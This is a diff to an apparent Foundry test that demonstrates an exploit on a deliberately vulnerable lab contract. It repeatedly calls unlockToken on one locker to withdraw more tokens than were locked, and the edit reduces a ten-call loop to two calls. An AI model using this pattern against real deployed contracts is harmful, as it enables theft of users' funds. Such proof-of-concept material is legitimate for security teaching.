@@ -46,29 +46,23 @@ contract ContractTest is Test {
         //In foundry, default timestamp is 1.
         console.log("Current timestamp", block.timestamp);
         vm.startPrank(alice);
-        BanksLPContract.approve(address(VulnerableBankContract), 10000);
+        BanksLPContract.approve(address(VulnerableBankContract), 5000);
         console.log(
-            "Before locking, my BanksLP balance",
-            BanksLPContract.balanceOf(address(alice))
+            "Alice Token balance before:",
+            BanksLPContract.balanceOf(alice)
         );
-        //lock 10000 for a day
+
         VulnerableBankContract.createLocker(
             address(BanksLPContract),
-            10000,
-            86400
+            5000,
+            1000
         );
+
+        VulnerableBankContract.unlockToken(1);
+        VulnerableBankContract.unlockToken(1);
         console.log(
-            "Before exploiting, my BanksLP balance",
-            BanksLPContract.balanceOf(address(alice))
-        );
-        //vm.warp(88888);
-        //exploit it,
-        for (uint i = 0; i < 10; i++) {
-            VulnerableBankContract.unlockToken(1);
-        }
-        console.log(
-            "After exploiting, my BanksLP balance",
-            BanksLPContract.balanceOf(address(alice))
+            "Alice Token balance before:",
+            BanksLPContract.balanceOf(alice)
         );
     }
 
